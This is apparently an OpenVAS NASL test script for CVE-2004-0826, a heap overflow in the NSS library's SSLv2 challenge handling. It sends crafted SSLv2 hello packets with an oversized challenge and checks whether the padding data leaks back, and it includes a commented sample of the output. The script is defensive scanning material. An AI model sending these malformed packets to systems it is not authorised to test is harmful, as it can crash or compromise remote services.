###############################################################################
# OpenVAS Vulnerability Test
#
# NSS Library SSLv2 Challenge Overflow
#
# Authors:
# H D Moore <hdmoore@digitaldefense.net>
#
# Copyright:
# Copyright (C) 2004 Digital Defense
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14361");
  script_version("2019-04-24T07:26:10+0000");
  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2004-0826");
  script_bugtraq_id(11015);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("NSS Library SSLv2 Challenge Overflow");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("This script is Copyright (C) 2004 Digital Defense");
  script_family("Gain a shell remotely");
  script_dependencies("find_service.nasl", "http_version.nasl", "gb_tls_version_get.nasl");
  script_mandatory_keys("ssl_tls/port");

  script_tag(name:"solution", value:"Upgrade the remote service to use NSS 3.9.2 or newer.");

  script_tag(name:"summary", value:"The remote host seems to be using the Mozilla Network Security Services (NSS)
  Library, a set of libraries designed to support the development of security-enabled client/server application.");

  script_tag(name:"impact", value:"There seems to be a flaw in the remote version of this library, in the SSLv2 handling code, which may allow
  an attacker to cause a heap overflow and therefore execute arbitrary commands on the remote host. To exploit this
  flaw, an attacker would need to send a malformed SSLv2 'hello' message to the remote service.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("ssl_funcs.inc");

if( ! port = get_ssl_port() )
  exit( 0 );

banner = get_http_banner( port:port );

if( safe_checks() ) {
  test = 0;
} else {
  test = 1;
}

if( banner ) {
  if( egrep( pattern:".*(Netscape.Enterprise|Sun-ONE).*", string:banner ) ) {
    test++;
  }
}

if( ! test )
  exit( 0 );

soc = open_sock_tcp( port, transport:ENCAPS_IP );
if( ! soc )
  exit( 0 );

# First we try a normal hello
req = raw_string( 0x80, 0x1c, 0x01, 0x00,
                  0x02, 0x00, 0x03, 0x00,
                  0x00, 0x00, 0x10, 0x07,
                  0x00, 0xc0 )
                  + crap(16, "VT-Test" );

send( socket:soc, data:req );
res = recv( socket:soc, length:64 );
close( soc );

# SSLv2 servers should respond back with the certificate at this point
if( strlen( res ) < 64 )
  exit( 0 );

# Now we try to overwrite most of the SSL response packet
# this should result in some of our data leaking back to us

soc = open_sock_tcp( port, transport:ENCAPS_IP );
if( ! soc )
  exit( 0 );

req = raw_string( 0x80, 0x44, 0x01, 0x00,
                  0x02, 0x00, 0x03, 0x00,
                  0x00, 0x00, 0x38, 0x07,
                  0x00, 0xc0 )
                  + crap( 16, data:"VT-Test" )
                  + crap( 40, data:"VULN" );

send( socket:soc, data:req );
res = recv( socket:soc, length:2048 );
close( soc );

if( "VULN" >< res ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );

#-- contents of res after test --
#$ nasl DDI_NSS_SSLv2_Challenge_Overflow.nasl -t 192.168.50.192
#** WARNING : packet forgery will not work
#** as NASL is not running as root
#.....
#8.?.....
#(/..5._.2..I....S@J\i.......wK..H.....v4.o..T.......f......3V>.o.l.O."....X.G..:G7.....9a...... ....V...t.Sf
#|....8...VULNVULNVULNVULNh